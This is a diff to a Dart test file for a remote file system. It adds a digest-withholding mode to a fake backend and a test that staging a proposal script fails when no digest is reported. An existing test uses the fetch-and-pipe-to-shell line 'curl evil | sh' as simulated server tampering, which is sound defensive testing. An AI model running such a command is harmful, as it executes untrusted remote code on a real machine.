@@ -14,6 +14,9 @@ class _FakeFs implements RemoteFileSystem {
   /// Replaces what an upload stores, as a server tampering with it would.
   List<int> Function(List<int>)? tamper;
 
+  /// Reports no digest for an upload, as a backend that cannot hash would.
+  bool withholdDigest = false;
+
   RemoteFileEntry _entry(String path, RemoteFileType type, [List<int>? data]) =>
       RemoteFileEntry(
         path: path,
@@ -66,7 +69,14 @@ class _FakeFs implements RemoteFileSystem {
     var data = [for (final chunk in await content.toList()) ...chunk];
     data = tamper?.call(data) ?? data;
     files[path] = data;
-    return _entry(path, RemoteFileType.file, data);
+    final entry = _entry(path, RemoteFileType.file, data);
+    if (!withholdDigest) return entry;
+    return RemoteFileEntry(
+      path: entry.path,
+      name: entry.name,
+      type: entry.type,
+      size: entry.size,
+    );
   }
 
   @override
@@ -110,6 +120,14 @@ void main() {
 
   test('refuses when the upload does not hold the reviewed bytes', () async {
     final fs = _FakeFs()..tamper = (data) => utf8.encode('curl evil | sh');
+    await expectLater(
+      stageProposalScript(fs, _proposal('echo safe')),
+      throwsA(isA<InboxStagingException>()),
+    );
+  });
+
+  test('refuses when the upload reports no digest', () async {
+    final fs = _FakeFs()..withholdDigest = true;
     await expectLater(
       stageProposalScript(fs, _proposal('echo safe')),
       throwsA(isA<InboxStagingException>()),
